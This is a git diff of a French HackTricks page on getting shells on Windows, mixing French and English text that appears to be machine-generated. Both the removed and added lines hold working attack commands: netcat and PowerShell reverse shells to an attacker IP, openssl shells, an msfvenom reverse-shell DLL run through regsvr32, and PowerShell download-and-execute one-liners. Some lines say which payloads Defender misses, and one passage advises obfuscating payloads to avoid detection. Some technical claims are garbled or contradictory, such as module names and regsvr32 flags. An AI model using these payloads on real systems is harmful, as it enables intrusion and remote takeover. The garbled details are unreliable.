@@ -4,7 +4,7 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -12,7 +12,7 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof est la plateforme des primes de bugs cryptographiques.**
 
@@ -25,14 +25,14 @@ Les protocoles blockchain et les contrats intelligents sont le nouvel Internet !
 **Devenez la légende du pirate web3**\
 Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.
 
-[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos piratages !
+[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) commencez à gagner grâce à vos piratages !
 
 {% embed url="https://hackenproof.com/register" %}
 
 ## Lolbas
 
 La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows ce que [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour Linux.\
-Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo sous Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (mal) utilisés pour effectuer des actions inattendues comme **exécuter du code arbitraire**.
+Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo sous Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (ab)usés pour effectuer des actions inattendues comme **exécuter du code arbitraire**.
 
 ## NC
 ```bash
@@ -116,55 +116,45 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo wil
 
 In the context of penetration testing, a shell is a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on Windows systems.
 
-## Netcat
+## Methodologies
 
-Netcat is a versatile networking utility that can be used to establish a reverse shell on a Windows machine. The basic idea is to listen for incoming connections on the attacker's machine and redirect the shell to that machine.
+### 1. Remote Desktop Protocol (RDP)
 
-To set up a reverse shell using Netcat, follow these steps:
+RDP is a proprietary protocol developed by Microsoft that allows a user to connect to a remote system over a network connection. If RDP is enabled on the target system and the attacker has valid credentials, they can use RDP to gain remote access and obtain a shell.
 
-1. On the attacker's machine, open a terminal and start listening for incoming connections:
+### 2. Exploiting Vulnerabilities
 
-   ```bash
-   nc -lvp <port>
-   ```
+Exploiting vulnerabilities in Windows systems is a common method to gain unauthorized access. By identifying and exploiting vulnerabilities in the target system, an attacker can execute arbitrary code and gain a shell.
 
-2. On the victim's machine, execute the following command to establish a connection with the attacker's machine:
+### 3. Social Engineering
 
-   ```bash
-   nc <attacker_ip> <port> -e cmd.exe
-   ```
+Social engineering involves manipulating individuals to gain unauthorized access to a system. By tricking a user into running malicious code or disclosing sensitive information, an attacker can gain access to the system and obtain a shell.
 
-   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.
+### 4. Malware
 
-3. Once the connection is established, the attacker will have a shell on the victim's machine.
+Malware, such as trojans or backdoors, can be used to gain unauthorized access to a system. By infecting the target system with malware, an attacker can establish a connection and obtain a shell.
 
-## PowerShell
+## Resources
 
-PowerShell is a powerful scripting language and command-line shell that is built into Windows. It provides a wide range of functionalities and can be used to execute commands on a remote Windows system.
+### 1. Metasploit Framework
 
-To establish a PowerShell session on a Windows machine, follow these steps:
+Metasploit Framework is a powerful tool for penetration testing and exploitation. It provides a wide range of exploits and payloads that can be used to gain shells on Windows systems.
 
-1. On the attacker's machine, open a terminal and start a listener using the `Invoke-PowerShellTcp` cmdlet:
+### 2. Cobalt Strike
 
-   ```powershell
-   Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port <port>
-   ```
+Cobalt Strike is a commercial penetration testing tool that includes features for post-exploitation, including the ability to gain shells on compromised Windows systems.
 
-   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.
+### 3. PowerShell Empire
 
-2. On the victim's machine, execute the following command to establish a connection with the attacker's machine:
+PowerShell Empire is a post-exploitation framework that allows an attacker to gain shells on Windows systems using PowerShell. It provides a variety of modules and techniques for maintaining persistence and evading detection.
 
-   ```powershell
-   powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-   ```
+### 4. Covenant
 
-   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.
-
-3. Once the connection is established, the attacker will have a PowerShell session on the victim's machine.
+Covenant is a .NET-based command and control framework that allows an attacker to gain shells on compromised Windows systems. It provides a user-friendly interface and a wide range of features for post-exploitation.
 
 ## Conclusion
 
-Obtaining a shell on a Windows system is a crucial step in the penetration testing process. By using tools like Netcat and PowerShell, an attacker can gain control over a compromised system and perform various malicious activities. It is important for security professionals to be aware of these techniques in order to defend against them effectively.
+Gaining a shell on a Windows system is a crucial step in the penetration testing process. By using the methodologies and resources mentioned in this section, an attacker can effectively gain unauthorized access and maintain control over a compromised system.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -186,21 +176,20 @@ Powershell permet aux hackers d'exécuter des commandes malveillantes sur des sy
 
 #### Accès à des informations sensibles
 
-En utilisant Powershell, les hackers peuvent accéder à des informations sensibles stockées sur des systèmes Windows. Ils peuvent extraire des mots de passe, des informations d'identification, des données personnelles, etc. en utilisant des commandes spécifiques de Powershell.
+En exploitant les fonctionnalités de Powershell, les hackers peuvent accéder à des informations sensibles stockées sur des systèmes Windows. Ils peuvent extraire des mots de passe, des informations d'identification, des données personnelles, etc. en utilisant des commandes Powershell spécifiques.
 
-#### Contournement des mesures de sécurité
+#### Compromission de la sécurité des systèmes
 
-Powershell offre aux hackers la possibilité de contourner les mesures de sécurité mises en place sur les systèmes Windows. Ils peuvent utiliser des techniques telles que l'obfuscation de code, l'utilisation de scripts malveillants dans des fichiers légitimes, etc. pour éviter la détection par les logiciels antivirus et les outils de sécurité.
+Powershell peut également être utilisé pour compromettre la sécurité des systèmes Windows. Les hackers peuvent utiliser des techniques telles que l'injection de code malveillant dans des scripts Powershell légitimes, l'exploitation de vulnérabilités connues dans Powershell, etc. pour compromettre la sécurité des systèmes.
 
 ### Prévention et détection de l'utilisation malveillante de Powershell
 
 Pour prévenir et détecter l'utilisation malveillante de Powershell, il est recommandé de prendre les mesures suivantes :
 
 - Restreindre l'accès à Powershell en utilisant des stratégies de groupe et des autorisations appropriées.
-- Mettre en place des mécanismes de surveillance pour détecter les activités suspectes liées à Powershell.
-- Maintenir les systèmes Windows à jour avec les derniers correctifs de sécurité pour réduire les vulnérabilités exploitées par les hackers.
-- Sensibiliser les utilisateurs aux risques liés à l'exécution de scripts Powershell provenant de sources non fiables.
-- Utiliser des outils de sécurité avancés qui peuvent détecter et bloquer les commandes malveillantes exécutées via Powershell.
+- Mettre en place des mécanismes de surveillance pour détecter les activités suspectes liées à Powershell, telles que l'exécution de commandes inconnues ou l'accès à des fichiers sensibles.
+- Maintenir les systèmes Windows à jour avec les derniers correctifs de sécurité pour réduire les risques d'exploitation de vulnérabilités connues dans Powershell.
+- Sensibiliser les utilisateurs aux risques liés à l'exécution de scripts Powershell provenant de sources non fiables et les encourager à ne pas exécuter de scripts inconnus.
 
 En suivant ces mesures de prévention et de détection, il est possible de réduire les risques liés à l'utilisation malveillante de Powershell et de renforcer la sécurité des systèmes Windows.
 ```bash
@@ -316,14 +305,12 @@ To use the `mshta` module in Metasploit, follow these steps:
 1. Start Metasploit by running the `msfconsole` command.
 2. Search for the `mshta` module using the `search` command: `search mshta`.
 3. Load the `mshta` module using the `use` command followed by the module name: `use exploit/windows/browser/mshta`.
-4. Set the required options for the module. You can view the available options using the `show options` command.
-5. Set the payload to be executed using the `set payload` command. For example, you can use the `windows/meterpreter/reverse_tcp` payload.
-6. Set any additional options required for the payload, such as the `LHOST` and `LPORT` values.
-7. Run the exploit using the `exploit` command.
+4. Set the required options for the module. You can use the `show options` command to view the available options and the `set` command to set their values.
+5. Run the exploit using the `exploit` command.
 
-Once the exploit is successful, you will have a Meterpreter session on the target system, giving you full control over the compromised machine.
+Once the exploit is successful, you will have a Meterpreter session on the target system, giving you full control over it. From there, you can perform various post-exploitation activities, such as privilege escalation, lateral movement, and data exfiltration.
 
-It is important to note that using Metasploit for unauthorized access or malicious purposes is illegal and unethical. This information is provided for educational purposes only, to help security professionals understand and defend against potential attacks.
+It is important to note that using Metasploit or any other hacking tool without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal rights before conducting any penetration testing activities.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -369,21 +356,23 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Rundll32 - Metasploit**
 
-Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be exploited by an attacker to execute malicious code. Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32, allowing the attacker to gain control over the target system.
+Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be exploited by an attacker to execute malicious code on a target system.
 
-To use this technique, follow these steps:
+Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32 to achieve code execution on the target system.
 
-1. Generate the malicious HTA file using the `windows/local/hta` module in Metasploit.
-2. Transfer the HTA file to the target system.
-3. Execute the HTA file using Rundll32 with the following command:
+To use this module, follow these steps:
 
-```
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://<attacker_ip>/payload.hta");
-```
+1. Start Metasploit by running the `msfconsole` command.
+2. Search for the `windows/local/hta` module using the `search` command.
+3. Load the module using the `use` command followed by the module name.
+4. Set the required options using the `set` command. These options include the `LHOST` (attacker's IP address) and `LPORT` (attacker's listening port).
+5. Generate the malicious HTA file using the `generate` command.
+6. Transfer the generated HTA file to the target system.
+7. Execute the HTA file using Rundll32 on the target system.
 
-Replace `<attacker_ip>` with the IP address of the machine running the Metasploit framework.
+Once the HTA file is executed, the attacker will have a Meterpreter session on the target system, allowing them to perform various post-exploitation activities.
 
-By executing the HTA file with Rundll32, the attacker can run arbitrary code on the target system and gain control over it. This technique can be used to escalate privileges, install backdoors, or perform other malicious activities. It is important to note that this technique may trigger antivirus alerts, so additional evasion techniques may be necessary to bypass detection.
+It is important to note that the use of Rundll32 for executing malicious code may trigger antivirus alerts. Therefore, it is recommended to use appropriate evasion techniques to bypass antivirus detection.
 ```bash
 use windows/smb/smb_delivery
 run
@@ -438,7 +427,7 @@ Pour se protéger contre les attaques utilisant Regsvr32, il est recommandé de 
 - Surveiller les activités suspectes sur le réseau et les systèmes pour détecter les éventuelles attaques.
 - Sensibiliser les utilisateurs aux techniques d'ingénierie sociale et aux risques liés à l'ouverture de fichiers ou de liens provenant de sources non fiables.
 
-En suivant ces mesures de sécurité, vous pouvez réduire les risques d'exploitation de Regsvr32 et protéger votre système contre les attaques.
+En suivant ces bonnes pratiques, vous pouvez réduire les risques d'exploitation de Regsvr32 et renforcer la sécurité de votre système.
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -471,27 +460,34 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Regsvr32 - Metasploit**
 
-Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used as a technique to execute arbitrary code on a target system. Metasploit, a popular penetration testing framework, provides a module called `regsvr32_command_delivery` that leverages this technique.
+Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used to execute arbitrary code. In the context of Metasploit, Regsvr32 can be leveraged to bypass application whitelisting and execute malicious code on a target system.
 
-The `regsvr32_command_delivery` module generates a malicious DLL file and registers it using the regsvr32 utility. When the DLL is registered, the code within it is executed, allowing the attacker to gain control over the target system.
+To use Regsvr32 with Metasploit, follow these steps:
 
-To use this module, you need to set the `DLL` option to the path of the DLL file you want to generate. You can also set the `CMD` option to specify the command you want to execute on the target system.
+1. Generate a payload using Metasploit's `msfvenom` tool. For example, to generate a reverse shell payload:
 
-Once the options are set, you can run the module using the `exploit` command. Metasploit will generate the malicious DLL file and register it using regsvr32. The specified command will then be executed on the target system.
+   ```
+   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
+   ```
 
-This technique can be effective for bypassing security measures that may block other methods of code execution. However, it is important to note that it relies on the target system having the regsvr32 utility available and the ability to register DLL files.
+2. Transfer the generated payload to the target system.
 
-#### **Regsvr32 - Metasploit**
+3. On the target system, use Regsvr32 to execute the payload:
 
-Regsvr32 est un utilitaire en ligne de commande de Windows utilisé pour enregistrer et désenregistrer des fichiers DLL. Il peut également être utilisé comme une technique pour exécuter du code arbitraire sur un système cible. Metasploit, un framework populaire de test de pénétration, fournit un module appelé `regsvr32_command_delivery` qui exploite cette technique.
+   ```
+   regsvr32 /s /n /u /i:<path to payload.dll>
+   ```
 
-Le module `regsvr32_command_delivery` génère un fichier DLL malveillant et l'enregistre à l'aide de l'utilitaire regsvr32. Lorsque le DLL est enregistré, le code à l'intérieur est exécuté, permettant à l'attaquant de prendre le contrôle du système cible.
+   - `/s` - Silent mode, no dialog boxes will be displayed.
+   - `/n` - Do not call DllRegisterServer.
+   - `/u` - Unregister the DLL file.
+   - `/i` - Specify the path to the DLL file.
 
-Pour utiliser ce module, vous devez définir l'option `DLL` sur le chemin du fichier DLL que vous souhaitez générer. Vous pouvez également définir l'option `CMD` pour spécifier la commande que vous souhaitez exécuter sur le système cible.
+   Note: The `/i` flag is used to specify the path to the DLL file, but it is not necessary for the payload to be registered.
 
-Une fois les options définies, vous pouvez exécuter le module à l'aide de la commande `exploit`. Metasploit générera le fichier DLL malveillant et l'enregistrera à l'aide de regsvr32. La commande spécifiée sera ensuite exécutée sur le système cible.
+4. The payload will be executed, establishing a reverse shell connection to the attacker's machine.
 
-Cette technique peut être efficace pour contourner les mesures de sécurité qui peuvent bloquer d'autres méthodes d'exécution de code. Cependant, il est important de noter qu'elle repose sur le fait que le système cible dispose de l'utilitaire regsvr32 disponible et de la possibilité d'enregistrer des fichiers DLL.
+Regsvr32 can be a powerful tool for bypassing application whitelisting and executing arbitrary code on a target system. However, it is important to note that its usage may raise suspicion, as it is not a commonly used utility. Therefore, it is crucial to use it in a stealthy manner and to ensure that the payload is properly obfuscated to avoid detection.
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -514,16 +510,14 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```
 **Détecté par le défenseur**
 
-
-
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof est le lieu de tous les programmes de primes pour les bugs de crypto.**
 
 **Obtenez des récompenses sans délai**\
 Les primes HackenProof sont lancées uniquement lorsque leurs clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.
 
-**Acquérez de l'expérience en pentesting web3**\
+**Acquérez de l'expérience en pentest web3**\
 Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.
 
 **Devenez la légende du hacker web3**\
@@ -539,23 +533,21 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```
 **Cscript - Metasploit**
 
-Cscript is a command-line scripting engine provided by Microsoft for running scripts written in VBScript or JScript. It is commonly used for administrative tasks and automation on Windows systems.
+Cscript is a command-line scripting engine provided by Microsoft for running scripts written in VBScript or JScript. It is commonly used for administrative tasks and automation on Windows systems. Metasploit, on the other hand, is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules.
 
-Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It is widely used by security professionals to test the security of computer systems.
+When it comes to exploiting Windows systems, Metasploit provides several modules that leverage the Cscript engine to execute malicious scripts. These modules allow an attacker to run arbitrary code on a target system by taking advantage of vulnerabilities in the Cscript engine or by using social engineering techniques to trick the user into running a malicious script.
 
-When it comes to exploiting Windows systems using Metasploit, Cscript can be a useful tool. By leveraging Cscript, you can execute VBScript or JScript code on a target Windows machine, allowing you to perform various actions, such as executing commands, manipulating files, or even establishing a remote shell.
+One such module is the `exploit/windows/script/web_delivery` module, which generates a malicious VBScript or JScript payload and delivers it to the target system through a web server. The payload is executed using the Cscript engine, allowing the attacker to gain remote access to the target system.
 
-To use Cscript with Metasploit, you can create a malicious script using VBScript or JScript that contains the desired payload or exploit. Once the script is created, you can use Metasploit's `exploit/windows/local/script/web_delivery` module to generate a URL that will deliver the script to the target machine.
+Another module is the `exploit/windows/fileformat/cve_2017_0199_rtf` module, which exploits a vulnerability in Microsoft Office to execute arbitrary code. This module uses a specially crafted RTF file that contains a malicious script, which is executed using the Cscript engine when the file is opened.
 
-When the target user visits the URL, the script will be executed by Cscript on their machine, triggering the desired payload or exploit. This can be an effective way to gain remote access to a Windows system or escalate privileges.
+To use these modules, the attacker needs to set the appropriate options, such as the payload type, the target IP address, and the listening address for the reverse shell. Once the options are configured, the attacker can run the exploit and wait for the target system to execute the malicious script.
 
-It is important to note that using Cscript with Metasploit requires careful planning and consideration of the target environment. It is crucial to ensure that the script and payload are properly crafted to avoid detection and maximize the chances of success.
-
-Overall, Cscript can be a valuable tool when combined with Metasploit for exploiting Windows systems. By understanding its capabilities and limitations, you can enhance your penetration testing efforts and effectively assess the security of Windows-based environments.
+It is important to note that using these modules for unauthorized access to systems is illegal and unethical. They should only be used for legitimate purposes, such as penetration testing or security research, with proper authorization.
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Détecté par Defender**
+**Détecté par le défenseur**
 
 ## PS-Bat
 ```bash
@@ -673,7 +665,7 @@ powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).
 
-**TODO: Vérifier les autres shells de nishang**
+**TODO: Vérifier les autres shells nishang**
 
 ### **PS-Powercat**
 
@@ -726,7 +718,7 @@ Démarrez msfconsole avec la ressource créée:
 ```
 msfconsole -r unicorn.rc
 ```
-Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le sur la victime :
+Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le sur la victime :
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -749,7 +741,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modul
 
 ​
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof est le lieu de tous les programmes de primes pour les bugs cryptographiques.**
 
